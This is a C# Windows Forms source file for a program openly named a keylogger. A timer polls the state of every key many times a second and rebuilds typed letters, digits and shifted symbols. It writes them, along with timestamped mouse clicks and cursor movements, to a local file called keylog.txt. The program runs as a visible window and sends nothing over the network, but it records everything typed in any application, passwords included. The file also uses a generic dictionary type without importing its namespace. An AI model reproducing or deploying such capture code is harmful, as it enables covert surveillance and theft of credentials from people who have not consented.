

namespace KeyloggerProject
{
    using System;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;

    public enum MouseButton
    {
        Left,
        Right,
        Middle
    }
    public partial class Form1 : Form
    {
        private DateTime lastMouseMoveTime = DateTime.MinValue;
        private POINT lastMousePos;
        private string currentText = "";
        private Dictionary<Keys, DateTime> keyLastPressed = new Dictionary<Keys, DateTime>();
        private Dictionary<MouseButton, DateTime> mouseLastPressed = new Dictionary<MouseButton, DateTime>();
        private int keyRepeatDelayMs = 150;


        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;
        }

        [DllImport("user32.dll")]
        public static extern bool GetCursorPos(out POINT lpPoint);

    


        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        Timer timer;
        StreamWriter sw;




        public Form1()
        {
            InitializeComponent();
            timer = new Timer();
            timer.Interval = 30;
            timer.Tick += Timer_Tick;
            timer.Start();

            sw = new StreamWriter("keylog.txt", false);
        }



        private void CheckMouseClick(MouseButton button, int keyCode, DateTime now)
        {
            if ((GetAsyncKeyState(keyCode) & 0x8000) != 0)
            {
                if (!mouseLastPressed.ContainsKey(button) || (now - mouseLastPressed[button]).TotalMilliseconds >= keyRepeatDelayMs)
                {
                    mouseLastPressed[button] = now;
                    sw.Write(Environment.NewLine+$"{button} mouse button clicked at {now}{Environment.NewLine}");
                    sw.Flush();
                }
            }
        }
        private void CheckMouseClicks()
        {
            DateTime now = DateTime.Now;

            CheckMouseClick(MouseButton.Left, 0x01, now);
            CheckMouseClick(MouseButton.Right, 0x02, now);
            CheckMouseClick(MouseButton.Middle, 0x04, now);
        }
        private void Timer_Tick(object sender, EventArgs e)
        {
            DateTime now = DateTime.Now;

            bool isShiftPressed =
              (GetAsyncKeyState((int)Keys.LShiftKey) & 0x8001) != 0 ||
              (GetAsyncKeyState((int)Keys.RShiftKey) & 0x8001) != 0;
            bool useUpperCase = isShiftPressed ^ Console.CapsLock;
            this.Text = $"Shift: {isShiftPressed} | CapsLock: {Console.CapsLock} | Upper: {useUpperCase}";

            for (int i = 0; i < 255; i++)
            {
                int state = GetAsyncKeyState(i);
                Keys key = (Keys)i;

                if ((state & 0x8000) != 0)
                {
                    if (!keyLastPressed.ContainsKey(key) || (now - keyLastPressed[key]).TotalMilliseconds >= keyRepeatDelayMs)
                    {
                        keyLastPressed[key] = now;

                        if (key == Keys.Back && currentText.Length > 0)
                        {
                            currentText = currentText.Substring(0, currentText.Length - 1);
                        }
                        else if (key == Keys.Space)
                        {
                            currentText += " ";
                        }
                        else if (key == Keys.Enter)
                        {
                            currentText += Environment.NewLine;
                        }
                        else if ((key >= Keys.D0 && key <= Keys.D9) && isShiftPressed)
                        {
                            currentText += GetShiftSymbol(key);
                        }
                        else if ((key >= Keys.D0 && key <= Keys.D9))
                        {
                            currentText += ConvertKey(key);
                        }
                        else if (key >= Keys.A && key <= Keys.Z)
                        {
                            string letter = ConvertUpperLower(key, useUpperCase);
                            currentText += letter;


                        }
                        sw.Write(currentText) ;
                        sw.Flush();
                        currentText = "";
                    }
                }
            }
            CheckMouseClicks();


            POINT cursorPos;
            if (GetCursorPos(out cursorPos))
            {
                DateTime mow = DateTime.Now;
                if ((now - lastMouseMoveTime).TotalMilliseconds >= keyRepeatDelayMs)
                {
                    if (cursorPos.X != lastMousePos.X || cursorPos.Y != lastMousePos.Y)
                    {
                        
                            string mouseMoveLog = Environment.NewLine + $"Mouse moved to: ({cursorPos.X}, {cursorPos.Y}){Environment.NewLine}";
                            sw.Write(mouseMoveLog);
                            sw.Flush();
                            lastMouseMoveTime = now;
                            lastMousePos = cursorPos;
                        }
                    
                }
            }
        }

        private string GetShiftSymbol(Keys key)
        {
            switch (key)
            {
                case Keys.D1: return "!";
                case Keys.D2: return "@";
                case Keys.D3: return "#";
                case Keys.D4: return "$";
                case Keys.D5: return "%";
                case Keys.D6: return "^";
                case Keys.D7: return "&";
                case Keys.D8: return "*";
                case Keys.D9: return "(";
                case Keys.D0: return ")";
                default: return "";
            }
        }


        private string ConvertKey(Keys key)
        {
            if (key >= Keys.D0 && key <= Keys.D9)
                return ((char)('0' + (key - Keys.D0))).ToString();

            return key.ToString();
        }
        private string ConvertUpperLower(Keys key, bool toUpper)
        {
            if (key >= Keys.A && key <= Keys.Z)
            {
                char baseChar = (char)('a' + (key - Keys.A));
                return toUpper ? char.ToUpper(baseChar).ToString() : baseChar.ToString();
            }

            return "";

        }




        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            sw.Close();
            base.OnFormClosed(e);
        }
    }
}
